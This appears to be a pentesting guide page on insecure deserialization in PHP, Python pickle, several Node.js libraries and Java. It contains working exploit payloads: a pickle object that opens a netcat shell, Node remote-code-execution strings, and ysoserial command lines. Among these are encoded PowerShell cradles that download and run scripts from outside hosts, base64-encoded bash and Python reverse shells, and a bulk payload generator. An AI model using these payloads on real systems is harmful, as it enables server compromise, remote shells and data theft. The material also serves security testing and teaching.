<h1 id="Deserialization"><a href="#Deserialization" class="headerlink" title="Deserialization"></a>Deserialization</h1><p><strong>Serialization</strong> is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications.</p>
<p><strong>Deserialization</strong> is the reverse of that process, taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.</p>
<p>In many occasions you can find some code in the server side that unserialize some object given by the user.<br>In this case, you can send a malicious payload to make the server side behave unexpectedly.</p>
<p><strong>You should read:</strong> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html" target="_blank" rel="noopener"><strong>https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html</strong></a> <strong>for learn how to attack.</strong></p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>Magic method used with serialization:</p>
<ul>
<li><code>__sleep</code> is called when an object is serialized and must be returned to array</li>
</ul>
<p>Magic method used with deserialization</p>
<ul>
<li><code>__wakeup</code> is called when an object is deserialized. </li>
<li><code>__destruct</code> is called when PHP script end and object is destroyed. </li>
<li><code>__toString</code> uses object as string but also can be used to read file or more than that based on function call inside it.</li>
</ul>
<pre><code class="php">&lt;?php
class test {
    public $s = &quot;This is a test&quot;;
    public function displaystring(){
        echo $this-&gt;s.&#39;&lt;br /&gt;&#39;;
    }
    public function __toString()
    {
        echo &#39;__toString method called&#39;;
    }
    public function __construct(){
        echo &quot;__construct method called&quot;;
    }
    public function __destruct(){
        echo &quot;__destruct method called&quot;;
    }
    public function __wakeup(){
        echo &quot;__wakeup method called&quot;;
    }
    public function __sleep(){
        echo &quot;__sleep method called&quot;;
        return array(&quot;s&quot;); #The &quot;s&quot; makes references to the public attribute
    }
}

$o = new test();
$o-&gt;displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser-&gt;displaystring();

/*
php &gt; $o = new test();
__construct method called__destruct method called
php &gt; $o-&gt;displaystring();
This is a test&lt;br /&gt;
php &gt; $ser=serialize($o);
__sleep method called
php &gt; echo $ser;
O:4:&quot;test&quot;:1:{s:1:&quot;s&quot;;s:14:&quot;This is a test&quot;;}
php &gt; $unser=unserialize($ser);
__wakeup method called__destruct method called
php &gt; $unser-&gt;displaystring();
This is a test&lt;br /&gt;
*/
?&gt;
</code></pre>
<p>If you look to the results you can see that the functions <code>__wakeup</code> and <code>__destruct</code> are called when the object is deserialized. Note that in several tutorials you will find that the <code>__toString</code> function is called when trying yo print some attribute, but apparently that’s <strong>not happening anymore</strong>.</p>
<p><a href="https://www.php.net/manual/en/language.oop5.autoload.php" target="_blank" rel="noopener"><strong>Autoload Classes</strong></a> may also be <strong>dangerous</strong>.</p>
<p>You can read an explained <strong>PHP example here</strong>: <a href="https://www.notsosecure.com/remote-code-execution-via-php-unserialize/" target="_blank" rel="noopener">https://www.notsosecure.com/remote-code-execution-via-php-unserialize/</a>, here <a href="https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf" target="_blank" rel="noopener">https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf</a> or here <a href="https://securitycafe.ro/2015/01/05/understanding-php-object-injection/" target="_blank" rel="noopener">https://securitycafe.ro/2015/01/05/understanding-php-object-injection/</a></p>
<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="Pickle"><a href="#Pickle" class="headerlink" title="Pickle"></a><strong>Pickle</strong></h3><p>When the object gets unpickle, the function <em>__reduce__</em> will be executed.<br>When exploited, server could return an error.</p>
<pre><code class="python">import cPickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,(&quot;netcat -c &#39;/bin/bash -i&#39; -l -p 1234 &quot;,))
print(base64.b64encode(cPickle.dumps(P())))
</code></pre>
<h2 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h2><h3 id="node-serialize"><a href="#node-serialize" class="headerlink" title="node-serialize"></a><a href="https://www.npmjs.com/package/node-serialize" target="_blank" rel="noopener">node-serialize</a></h3><p>This library allows to serialise functions. Example:</p>
<pre><code class="javascript">var y = {
 &quot;rce&quot;: function(){ require(&#39;child_process&#39;).exec(&#39;ls /&#39;, function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require(&#39;node-serialize&#39;);
var payload_serialized = serialize.serialize(y);
console.log(&quot;Serialized: \n&quot; + payload_serialized);
</code></pre>
<p>The <strong>serialised object</strong> will looks like:</p>
<pre><code class="bash">{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function(){ require(&#39;child_process&#39;).exec(&#39;ls /&#39;, function(error, stdout, stderr) { console.log(stdout) })}&quot;}
</code></pre>
<p>You can see in the example that when a function is serialized the <code>_$$ND_FUNC$$_</code> flag is appended to the serialized object.</p>
<p>Inside the file <code>node-serialize/lib/serialize.js</code> you can find the same flag and how the code is using it.</p>
<p><img src="../../.gitbook/assets/image%20(98).png"></p>
<p><img src="../../.gitbook/assets/image%20(91).png"></p>
<p>As you may see in the last chunk of code, <strong>if the flag is found</strong> <code>eval</code> is used to deserialize the function, so basically <strong>user input if being used inside the <code>eval</code> function</strong>.</p>
<p>However, <strong>just serialising</strong> a function <strong>won’t execute it</strong> as it would be necessary that some part of the code is <strong>calling <code>y.rce</code></strong> in our example and that’s highly <strong>unlikable</strong>.<br>Anyway, you could just <strong>modify the serialised object</strong> <strong>adding some parenthesis</strong> in order to auto execute the serialized function when the object is deserialized.<br>In the next chunk of code <strong>notice the last parenthesis</strong> and how the <code>unserialize</code> function will automatically execute the code:</p>
<pre><code class="javascript">var serialize = require(&#39;node-serialize&#39;);
var test = {&quot;rce&quot;:&quot;_$$ND_FUNC$$_function(){ require(&#39;child_process&#39;).exec(&#39;ls /&#39;, function(error, stdout, stderr) { console.log(stdout) }); }()&quot;};
serialize.unserialize(test);
</code></pre>
<p>As it was previously indicated, this library will get the code after<code>_$$ND_FUNC$$_</code> and will <strong>execute it</strong> using <code>eval</code>. Therefore, in order to <strong>auto-execute code</strong> you can <strong>delete the function creation</strong> part and the last parenthesis and <strong>just execute a JS oneliner</strong> like in the following example:</p>
<pre><code class="javascript">var serialize = require(&#39;node-serialize&#39;);
var test = &#39;{&quot;rce&quot;:&quot;_$$ND_FUNC$$_require(\&#39;child_process\&#39;).exec(\&#39;ls /\&#39;, function(error, stdout, stderr) { console.log(stdout) })&quot;}&#39;;
serialize.unserialize(test);
</code></pre>
<p>You can ****<a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/" target="_blank" rel="noopener"><strong>find here</strong></a> <strong>further information</strong> about how to exploit this vulnerability.</p>
<h3 id="funcster"><a href="#funcster" class="headerlink" title="funcster"></a><a href="https://www.npmjs.com/package/funcster" target="_blank" rel="noopener">funcster</a></h3><p>The interesting difference here is that the <strong>standard built-in objects are not accessible</strong>, because they are out of scope. It means that we can execute our code, but cannot call build-in objects’ methods. So if we use <code>console.log()</code> or <code>require(something)</code>, Node returns an exception like <code>&quot;ReferenceError: console is not defined&quot;</code>.</p>
<p>However, we can easily can get back access to everything because we still have access to the global context using something like  <code>this.constructor.constructor(&quot;console.log(1111)&quot;)();</code>:</p>
<pre><code class="javascript">funcster = require(&quot;funcster&quot;);
//Serialization
var test = funcster.serialize(function() { return &quot;Hello world!&quot; })
console.log(test) // { __js_function: &#39;function(){return&quot;Hello world!&quot;}&#39; }

//Deserialization with auto-execution
var desertest1 = { __js_function: &#39;function(){return &quot;Hello world!&quot;}()&#39; }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: &#39;this.constructor.constructor(&quot;console.log(1111)&quot;)()&#39; }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: &#39;this.constructor.constructor(&quot;require(\&#39;child_process\&#39;).exec(\&#39;ls /\&#39;, function(error, stdout, stderr) { console.log(stdout) });&quot;)()&#39; }
funcster.deepDeserialize(desertest3)
</code></pre>
<p><strong>For</strong><a href="https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/" target="_blank" rel="noopener"> <strong>more information read this page</strong></a><strong>.</strong></p>
<h3 id="serialize-javascript"><a href="#serialize-javascript" class="headerlink" title="****serialize-javascript****"></a>****<a href="https://www.npmjs.com/package/serialize-javascript" target="_blank" rel="noopener"><strong>serialize-javascript</strong></a>****</h3><p>The package <strong>doesn’t include any deserialization functionalit</strong>y and requires you to implement it yourself. Their example uses <code>eval</code> directly. This is the official deserialisation example:</p>
<pre><code class="javascript">function deserialize(serializedJavascript){
  return eval(&#39;(&#39; + serializedJavascript + &#39;)&#39;);
}
</code></pre>
<p>If this function is used to deserialize objects you can <strong>easily exploit it</strong>:</p>
<pre><code class="javascript">var serialize = require(&#39;serialize-javascript&#39;);
//Serialization
var test = serialize(function() { return &quot;Hello world!&quot; });
console.log(test) //function() { return &quot;Hello world!&quot; }

//Deserialization
var test = &quot;function(){ require(&#39;child_process&#39;).exec(&#39;ls /&#39;, function(error, stdout, stderr) { console.log(stdout) }); }()&quot;
deserialize(test)
</code></pre>
<h3 id="proto-abuse"><a href="#proto-abuse" class="headerlink" title="__proto__ abuse"></a>__proto__ abuse</h3><p><em><strong>(This information was taken from</strong>_ <a href="https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/" target="_blank" rel="noopener"><em><strong>here</strong></em> </a>_<strong>and</strong>_ <a href="https://hackerone.com/reports/350418" target="_blank" rel="noopener"><em><strong>here</strong></em></a>_<strong>).</strong></em></p>
<p><strong>Another way</strong> to achieve code execution is leveraging in <strong>functions</strong> with <strong>attacker’s controlled</strong> data which are <strong>called automatically</strong> <strong>during</strong> the <strong>deserialization</strong> process or after when an application interacts with a newly created object. Something similar to “magic methods” in other languages.</p>
<p>Many packages use the next approach in the deserialization process. They create an empty object and then set its properties using square brackets notations:</p>
<pre><code class="javascript">obj[key]=value
</code></pre>
<p>Secondly, a call of some function leads to the invoking of the function arguments’ methods. For example, when an object is converted to a string, then methods valueOf, toString of the object are called automatically (more details <a href="http://2ality.com/2012/03/converting-to-string.html" target="_blank" rel="noopener">here</a>). So, <code>console.log(obj)</code> leads to invocation of <code>obj.toString()</code>. Another example, <code>JSON.stringify(obj)</code> internally invokes obj.toJSON().</p>
<p>Abusing the  <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto" target="_blank" rel="noopener">__proto__ property </a>you can <strong>change the methods of the object</strong>, for example <code>obj.valueOf</code> or <code>obj.toString</code>. So, if you can modify the <code>__proto__</code> property of an object you can modify the behaviour of the object when a method is call: you could make it execute arbitrary code whenever <code>obj.toString</code> is called. Keep in mind that the <strong>execution</strong> of several <strong>methods</strong> are very <strong>common</strong>, for example <code>console.log(obj + &quot;anything&quot;)</code> will execute <code>obj.toString</code>, or  <code>JSON.stringify(obj)</code> internally invokes <code>obj.toJSON()</code>.</p>
<p>I’ve found a nice example – <a href="https://www.npmjs.com/package/cryo" target="_blank" rel="noopener">package Cryo</a>, which supports both function serialization and square bracket notation for object reconstruction, but which isn’t vulnerable to IIFE, because it properly manages object (without using <code>eval&amp;co</code>).</p>
<p>Here a code for serialization and deserialization of an object:</p>
<pre><code class="javascript">cvar Cryo = require(&#39;cryo&#39;);
var obj = {
testFunc : function() {return 1111;}
};

var frozen = Cryo.stringify(obj);
console.log(frozen)

var hydrated = Cryo.parse(frozen);
console.log(hydrated);
</code></pre>
<p>Abusing <code>__proto__</code> property to modify the behaviour of the object when calling <code>toString</code> and <code>valueOf</code> (Note that you need to modify the <strong>serialized object</strong> from <code>__proto</code> to <code>__proto__</code>  to abuse the deserialization):</p>
<pre><code class="javascript">// Simple deserialization executing a console.log
var obj = {
    __proto: {
        toString: function() {console.log(&quot;defconrussia&quot;); return 1111;},
        valueOf: function() {console.log(&quot;defconrussia&quot;); return 2222;}
    }
};
var sertest = Cryo.stringify(obj);
sertest //&#39;{&quot;root&quot;:&quot;_CRYO_REF_3&quot;,&quot;references&quot;:[{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function() {console.log(\\&quot;defconrussia\\&quot;); return 1111;}&quot;},{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function() {console.log(\\&quot;defconrussia\\&quot;); return 2222;}&quot;},{&quot;contents&quot;:{&quot;toString&quot;:&quot;_CRYO_REF_0&quot;,&quot;valueOf&quot;:&quot;_CRYO_REF_1&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;},{&quot;contents&quot;:{&quot;__proto&quot;:&quot;_CRYO_REF_2&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;}]}&#39;

var destest = &#39;{&quot;root&quot;:&quot;_CRYO_REF_3&quot;,&quot;references&quot;:[{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function() {console.log(\\&quot;defconrussia\\&quot;); return 1111;}&quot;},{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function() {console.log(\\&quot;defconrussia\\&quot;); return 2222;}&quot;},{&quot;contents&quot;:{&quot;toString&quot;:&quot;_CRYO_REF_0&quot;,&quot;valueOf&quot;:&quot;_CRYO_REF_1&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;},{&quot;contents&quot;:{&quot;__proto__&quot;:&quot;_CRYO_REF_2&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;}]}&#39;
var destestdone = Cryo.parse(destest);
console.log(destestdone + &quot;anything&quot;);


// Deserialization with RCE
var obj = {
    __proto: {
        toString: function(){ require(&#39;child_process&#39;).exec(&#39;ls /&#39;, function(error, stdout, stderr) { console.log(stdout) }); },
        valueOf: function(){ require(&#39;child_process&#39;).exec(&#39;ls /&#39;, function(error, stdout, stderr) { console.log(stdout) }); }
    }
};
var sertest = Cryo.stringify(obj);
sertest //&#39;{&quot;root&quot;:&quot;_CRYO_REF_3&quot;,&quot;references&quot;:[{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function() {console.log(\\&quot;defconrussia\\&quot;); return 1111;}&quot;},{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function() {console.log(\\&quot;defconrussia\\&quot;); return 2222;}&quot;},{&quot;contents&quot;:{&quot;toString&quot;:&quot;_CRYO_REF_0&quot;,&quot;valueOf&quot;:&quot;_CRYO_REF_1&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;},{&quot;contents&quot;:{&quot;__proto&quot;:&quot;_CRYO_REF_2&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;}]}&#39;

var destest = &#39;{&quot;root&quot;:&quot;_CRYO_REF_3&quot;,&quot;references&quot;:[{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function(){ require(\&#39;child_process\&#39;).exec(\&#39;ls /\&#39;, function(error, stdout, stderr) { console.log(stdout) }); }&quot;},{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function(){ require(\&#39;child_process\&#39;).exec(\&#39;ls /\&#39;, function(error, stdout, stderr) { console.log(stdout) }); }&quot;},{&quot;contents&quot;:{&quot;toString&quot;:&quot;_CRYO_REF_0&quot;,&quot;valueOf&quot;:&quot;_CRYO_REF_1&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;},{&quot;contents&quot;:{&quot;__proto__&quot;:&quot;_CRYO_REF_2&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;}]}&#39;
var destestdone = Cryo.parse(destest);
console.log(destestdone + &quot;anything&quot;);
</code></pre>
<h2 id="Java-HTTP"><a href="#Java-HTTP" class="headerlink" title="Java - HTTP"></a>Java - HTTP</h2><p>The main problem with deserialized objects in Java is that <strong>deserialization callbacks were invoked during deserialization</strong>. This makes possible for an <strong>attacker</strong> to <strong>take advantage of that callbacks</strong> and prepare a payload that abuses the callbacks to <strong>perform malicious actions</strong>.</p>
<h3 id="Fingerprints"><a href="#Fingerprints" class="headerlink" title="Fingerprints"></a>Fingerprints</h3><h4 id="White-Box"><a href="#White-Box" class="headerlink" title="White Box"></a>White Box</h4><p>Search inside the code for serialization classes and function. For example, search for classes implementing <code>Serializable</code> , the use of <code>java.io.ObjectInputStream</code> __or <code>readObject</code> <em><em>or <code>readUnshare</code> functions</em>.</em></p>
<p>You should also keep an eye on:</p>
<ul>
<li><code>XMLdecoder</code> with external user defined parameters</li>
<li><code>XStream</code> with <code>fromXML</code> method (xstream version &lt;= v1.46 is vulnerable to the serialization issue)</li>
<li><code>ObjectInputStream</code> with <code>readObject</code></li>
<li>Uses of <code>readObject</code>, <code>readObjectNodData</code>, <code>readResolve</code> or <code>readExternal</code></li>
<li><code>ObjectInputStream.readUnshared</code></li>
<li><code>Serializable</code></li>
</ul>
<h4 id="Black-Box"><a href="#Black-Box" class="headerlink" title="Black Box"></a>Black Box</h4><p><strong>Fingerprints/Magic Bytes</strong> of <strong>java serialised</strong> objects (from <code>ObjectInputStream</code>):</p>
<ul>
<li><code>AC ED 00 05</code> in Hex</li>
<li><code>rO0</code> in Base64</li>
<li><code>Content-type</code> header of an HTTP response set to <code>application/x-java-serialized-object</code></li>
<li><code>1F 8B 08 00</code>  Hex previously compressed</li>
<li><code>H4sIA</code> Base64 previously compressed</li>
<li>Web files with extension <code>.faces</code> and <code>faces.ViewState</code> parameter. If you find this in a wabapp, take a look to the <a href="java-jsf-viewstate-.faces-deserialization.md"><strong>post about Java JSF VewState Deserialization</strong></a>.</li>
</ul>
<pre><code class="text">javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
</code></pre>
<h3 id="Check-if-vulnerable"><a href="#Check-if-vulnerable" class="headerlink" title="Check if vulnerable"></a>Check if vulnerable</h3><p>If you want to <strong>learn about how does a Java Deserialized exploit work</strong> you should take a look to <a href="basic-java-deserialization-objectinputstream-readobject.md"><strong>Basic Java Deserialization</strong></a>, <a href="java-dns-deserialization-and-gadgetprobe.md"><strong>Java DNS Deserialization</strong></a>, and <a href="java-transformers-to-rutime-exec-payload.md"><strong>CommonsCollection1 Payload</strong></a>.</p>
<h4 id="White-Box-Test"><a href="#White-Box-Test" class="headerlink" title="White Box Test"></a>White Box Test</h4><p>You can check if there is installed any application with known vulnerabilities.</p>
<pre><code class="bash">find . -iname &quot;*commons*collection*&quot;
grep -R InvokeTransformer .
</code></pre>
<p>You could try to <strong>check all the libraries</strong> known to be vulnerable and that ****<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener"><strong>Ysoserial</strong> </a>can provide an exploit for. Or you could check the libraries indicated on <a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json" target="_blank" rel="noopener">Java-Deserialization-Cheat-Sheet</a>.<br>You could also use ****<a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener"><strong>gadgetinspector</strong></a> to search for possible gadget chains that can be exploited.<br>When running <strong>gadgetinspector</strong> (after building it) don’t care about the tons of warnings/errors that it’s going through and let it finish. It will write all the findings under <em>gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt</em>. Please, notice that <strong>gadgetinspector won’t create an exploit and it may indicate false positives</strong>.</p>
<h4 id="Black-Box-Test"><a href="#Black-Box-Test" class="headerlink" title="Black Box Test"></a>Black Box Test</h4><p>Using the Burp extension <a href="java-dns-deserialization-and-gadgetprobe.md"><strong>gadgetprobe</strong></a> you can identify <strong>which libraries are available</strong> (and even the versions). With this information it could be <strong>easier to choose a payload</strong> to exploit the vulnerability.<br><a href="java-dns-deserialization-and-gadgetprobe.md#gadgetprobe"><strong>Read this to learn more about GadgetProbe</strong></a><strong>.</strong><br>GadgetProbe is focused on <strong><code>ObjectInputStream</code></strong> deserializations**.**</p>
<p>Using Burp extension <a href="java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner"><strong>Java Deserialization Scanner</strong></a> you can <strong>identify vulnerable libraries</strong> exploitable with ysoserial and <strong>exploit</strong> them.<br><a href="java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner"><strong>Read this to learn more about Java Deserialization Scanner.</strong></a><br>****Java Deserialization Scanner is focused on <strong><code>ObjectInputStream</code></strong> deserializations.</p>
<p>You can also use <a href="https://github.com/nccgroup/freddy" target="_blank" rel="noopener"><strong>Freddy</strong></a> to <strong>detect deserializations</strong> vulnerabilities in <strong>Burp</strong>. This plugin will detect **not only <code>ObjectInputStream</code>**related vulnerabilities but <strong>also</strong> vulns from <strong>Json</strong> an <strong>Yml</strong> deserialization libraries. In active mode, it will try to confirm them using sleep or DNS payloads.<br><a href="https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/" target="_blank" rel="noopener"><strong>You can find more information about Freddy here.</strong></a>****</p>
<p><strong>Serialization Test</strong></p>
<p>Not all is about checking if any vulnerable library is used by the server. Sometimes you could be able to <strong>change the data inside the serialized object and bypass some checks</strong> (maybe grant you admin privileges inside a webapp).<br>If you find a java serialized object being sent to a web application, <strong>you can use</strong> <a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="noopener"><strong>SerializationDumper</strong></a> <strong>to print in a more human readable format the serialization object that is sent</strong>. Knowing which data are you sending would be easier to modify it and bypass some checks.</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><h4 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a><strong>ysoserial</strong></h4><p>The most well-known tool to exploit HTTP deserializations is ****<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener"><strong>ysoserial</strong></a> (<a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar" target="_blank" rel="noopener"><strong>download here</strong></a>).<br>****Note that this tool is <strong>focused</strong> on exploiting <strong><code>ObjectInputStream</code></strong>.<br>I would <strong>start using the “URLDNS”</strong> payload <strong>before a RCE</strong> payload to test if the injection is possible. Anyway, note that maybe the “URLDNS” payload is not working but other RCE payload is.</p>
<pre><code class="bash"># PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net &gt; payload

# PoC RCE in Windows
## Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 &#39;cmd /c ping -n 5 127.0.0.1&#39; &gt; payload
## Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 &quot;cmd /c timeout 5&quot; &gt; payload
## Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 &quot;cmd /c echo pwned&gt; C:\\\\Users\\\\username\\\\pwn&quot; &gt; payload
## DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 &quot;cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net&quot;
## HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 &quot;cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a&quot;
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 &quot;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA&quot;
### In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString(&#39;http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a&#39;)
### To encode something in Base64 for Windows PS from linux you can use: echo -n &quot;&lt;PAYLOAD&gt;&quot; | iconv --to-code UTF-16LE | base64 -w0
## Reverse Shell
### Encoded: IEX(New-Object Net.WebClient).downloadString(&#39;http://192.168.1.4:8989/powercat.ps1&#39;)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 &quot;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA&quot;

#PoC RCE in Linux
## Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 &quot;ping -c 5 192.168.1.4&quot; &gt; payload 
## Time
### Using time in bash I didn&#39;t notice any difference in the timing of the response
## Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 &quot;touch /tmp/pwn&quot; &gt; payload
## DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 &quot;dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net&quot;
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 &quot;nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net&quot;
## HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 &quot;curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net&quot; &gt; payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 &quot;wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net&quot;
## Reverse shell
### Encoded: bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}&quot; | base64 -w0
### Encoded: export RHOST=&quot;127.0.0.1&quot;;export RPORT=12345;python -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#39;
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 &quot;bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}&quot;

# Base64 encode payload in base64
base64 -w0 payload
</code></pre>
<p>When creating a payload for <strong>java.lang.Runtime.exec()</strong> you <strong>cannot use special characters</strong> like “&gt;” or “|“ to redirect the output of an execution, “$()“ to execute commands or even <strong>pass arguments</strong> to a command separated by <strong>spaces</strong> (you can do <code>echo -n &quot;hello world&quot;</code> but you can’t do <code>python2 -c &#39;print &quot;Hello world&quot;&#39;</code>). In order to encode correctly the payload you could <a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">use this webpage</a>.</p>
<p>Feel free to use the next script to create <strong>all the possible code execution</strong> payloads for Windows and Linux and then test them on the vulnerable web page:</p>
<pre><code class="python">import os
import base64
 
# You may need to update the payloads
payloads = [&#39;BeanShell1&#39;, &#39;Clojure&#39;, &#39;CommonsBeanutils1&#39;, &#39;CommonsCollections1&#39;, &#39;CommonsCollections2&#39;, &#39;CommonsCollections3&#39;, &#39;CommonsCollections4&#39;, &#39;CommonsCollections5&#39;, &#39;CommonsCollections6&#39;, &#39;CommonsCollections7&#39;, &#39;Groovy1&#39;, &#39;Hibernate1&#39;, &#39;Hibernate2&#39;, &#39;JBossInterceptors1&#39;, &#39;JRMPClient&#39;, &#39;JSON1&#39;, &#39;JavassistWeld1&#39;, &#39;Jdk7u21&#39;, &#39;MozillaRhino1&#39;, &#39;MozillaRhino2&#39;, &#39;Myfaces1&#39;, &#39;Myfaces2&#39;, &#39;ROME&#39;, &#39;Spring1&#39;, &#39;Spring2&#39;, &#39;Vaadin1&#39;, &#39;Wicket1&#39;]
def generate(name, cmd):
    for payload in payloads:
        final = cmd.replace(&#39;REPLACE&#39;, payload)
        print &#39;Generating &#39; + payload + &#39; for &#39; + name + &#39;...&#39;
        command = os.popen(&#39;java -jar ysoserial.jar &#39; + payload + &#39; &quot;&#39; + final + &#39;&quot;&#39;)
        result = command.read()
        command.close()
        encoded = base64.b64encode(result)
        if encoded != &quot;&quot;:
            open(name + &#39;_intruder.txt&#39;, &#39;a&#39;).write(encoded + &#39;\n&#39;)
 
generate(&#39;Windows&#39;, &#39;ping -n 1 win.REPLACE.server.local&#39;)
generate(&#39;Linux&#39;, &#39;ping -c 1 nix.REPLACE.server.local&#39;)
</code></pre>
